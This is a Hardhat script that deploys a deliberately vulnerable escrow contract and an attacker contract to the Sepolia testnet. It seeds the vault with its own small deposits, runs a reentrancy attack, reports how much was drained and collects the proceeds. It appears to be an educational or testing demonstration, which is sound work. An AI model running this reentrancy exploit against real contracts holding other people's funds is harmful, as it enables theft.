// Minimal Sepolia test - deploy just InsecureVault + Attacker + execute attack
const hre = require("hardhat");
const { ethers } = hre;

async function main() {
  const [wallet] = await ethers.getSigners();
  console.log(`Wallet: ${wallet.address}`);
  console.log(`Balance: ${ethers.formatEther(await ethers.provider.getBalance(wallet.address))} ETH\n`);

  // Deploy InsecureVault
  console.log("Deploying InsecureVault...");
  const InsecureVault = await ethers.getContractFactory("InsecureVault");
  const insecure = await InsecureVault.deploy();
  await insecure.waitForDeployment();
  const insecureAddr = await insecure.getAddress();
  const receipt1 = await insecure.deploymentTransaction().wait();
  console.log(`  InsecureVault: ${insecureAddr} (${receipt1.gasUsed} gas)\n`);

  // Deploy Attacker
  console.log("Deploying Attacker...");
  const Attacker = await ethers.getContractFactory("Attacker");
  const attacker = await Attacker.deploy(insecureAddr);
  await attacker.waitForDeployment();
  const attackerAddr = await attacker.getAddress();
  const receipt2 = await attacker.deploymentTransaction().wait();
  console.log(`  Attacker: ${attackerAddr} (${receipt2.gasUsed} gas)\n`);

  // Setup honeypot
  const fakeSeller = ethers.Wallet.createRandom().address;
  console.log("Setting up honeypot...");
  let tx = await insecure.createOrder(fakeSeller);
  await tx.wait();
  tx = await insecure.depositFunds(0, { value: ethers.parseEther("0.0001") });
  await tx.wait();
  tx = await insecure.confirmDelivery(0);
  await tx.wait();
  console.log("  Buyer A: deposited 0.0001 ETH");

  tx = await insecure.createOrder(fakeSeller);
  await tx.wait();
  tx = await insecure.depositFunds(1, { value: ethers.parseEther("0.00005") });
  await tx.wait();
  tx = await insecure.confirmDelivery(1);
  await tx.wait();
  console.log("  Buyer B: deposited 0.00005 ETH");

  tx = await insecure.createOrder(attackerAddr);
  await tx.wait();
  tx = await insecure.depositFunds(2, { value: ethers.parseEther("0.00001") });
  await tx.wait();
  tx = await insecure.confirmDelivery(2);
  await tx.wait();
  console.log("  Attacker: deposited 0.00001 ETH (as seller)");

  const vaultBal = await insecure.getContractBalance();
  console.log(`\n  Vault balance: ${ethers.formatEther(vaultBal)} ETH\n`);

  // Execute attack
  console.log("Executing reentrancy attack...");
  const vBefore = await insecure.getContractBalance();
  tx = await attacker.attack({ gasLimit: 300000 });
  const r = await tx.wait();
  console.log(`  Attack gas used: ${r.gasUsed}`);
  console.log(`  Gas price: ${ethers.formatUnits(r.gasPrice, "gwei")} gwei`);

  const reentryCount = await attacker.getReentrancyCount();
  const vAfter = await insecure.getContractBalance();
  const aEth = await ethers.provider.getBalance(attackerAddr);

  console.log(`  Reentrancy loops: ${reentryCount}`);
  console.log(`  Vault: ${ethers.formatEther(vBefore)} → ${ethers.formatEther(vAfter)} ETH`);
  console.log(`  Attacker contract: ${ethers.formatEther(aEth)} ETH`);
  console.log(`  Drained: ${ethers.formatEther(vBefore - vAfter)} ETH\n`);

  if (aEth > ethers.parseEther("0.00001")) {
    console.log("🔴 ATTACK SUCCESSFUL on Sepolia!");
    tx = await attacker.collectFunds();
    await tx.wait();
    const walletBal = await ethers.provider.getBalance(wallet.address);
    console.log(`  Wallet balance: ${ethers.formatEther(walletBal)} ETH`);
  } else {
    console.log("🟢 Attack FAILED on Sepolia");
  }

  console.log("\nDone. Save these addresses:");
  console.log(`INsecure_Vault_ADDR=${insecureAddr}`);
  console.log(`ATTACKER_ADDR=${attackerAddr}`);
}

main().catch(console.error);
